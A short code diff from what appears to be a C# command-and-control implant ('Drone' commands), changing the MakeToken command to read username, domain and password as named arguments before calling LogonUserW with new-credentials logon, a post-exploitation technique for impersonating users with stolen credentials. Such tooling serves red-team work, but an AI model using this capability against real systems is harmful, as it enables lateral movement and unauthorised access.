@@ -16,12 +16,10 @@ public sealed class MakeToken : DroneCommand
 
     public override Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
-        var split = task.Arguments[0].Split('\\');
-
         var hToken = LogonUserW(
-            split[1],
-            split[0],
-            task.Arguments[1],
+            task.Arguments["username"],
+            task.Arguments["domain"],
+            task.Arguments["password"],
             LOGON_USER_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
             LOGON_USER_PROVIDER.LOGON32_PROVIDER_WINNT50);
 
